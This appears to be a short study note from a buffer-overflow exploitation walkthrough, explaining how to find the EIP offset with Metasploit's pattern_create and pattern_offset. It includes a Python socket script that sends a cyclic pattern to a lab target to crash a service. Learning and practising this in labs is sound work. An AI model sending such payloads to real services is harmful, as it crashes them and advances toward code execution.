To find the offset or the point right before EIP you can use a tool called pattern_create and pattern_offset from metasploit framework.

First make a pattern with the length of the crash point from [[1. Fuzz]] 
`pattern_create.rb -l < length >`
That will output a bunch of stuff out and put the in the pattern variable in below code.

```python
import socket

ip, port = "10.10.10.10", 9999 # Change the ip and port
crash_point = 0  # change this with what you got from step 1
prefix = b"" # change this if necessary and make sure theres a space at the end.
pattern = b"" # Put the pattern you made from the pattern_create.

try:
	s = socket.socket()
	s.connect((ip, port))
	s.send(prefix + pattern)

except:
	print(f"Something went wrong")

s.close()
```

Now after executing the code and crashing the program check Immunity Debugger for the EIP. After find out the EIP use pattern_offset for it
`pattern_offset.rb -q <EIP>`

That shoud give you the offset / the point right before EIP.
